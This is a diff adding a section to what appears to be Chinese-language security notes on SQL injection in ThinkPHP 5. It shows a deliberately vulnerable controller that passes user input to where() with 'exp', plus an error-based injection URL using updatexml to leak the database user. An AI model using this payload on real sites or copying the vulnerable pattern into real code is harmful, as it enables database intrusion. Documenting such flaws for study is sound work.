@@ -229,4 +229,25 @@ insert是直接替换的字符串，使用如下触发sql注入
 
 ^
 ## **ThinkPHP5全版本 sql注入**
+application/index/controller/Index.php文件代码设置如下：
+```
+<?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()->get('username');
+        $result = db('users')->where('username','exp',$username)->select(); //触发条件
+        return 'select success';
+    }
+}
+```
+config/app.php 中开启 app_debug 和 app_trace。
+报错注入
+```
+/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
+```
+
 
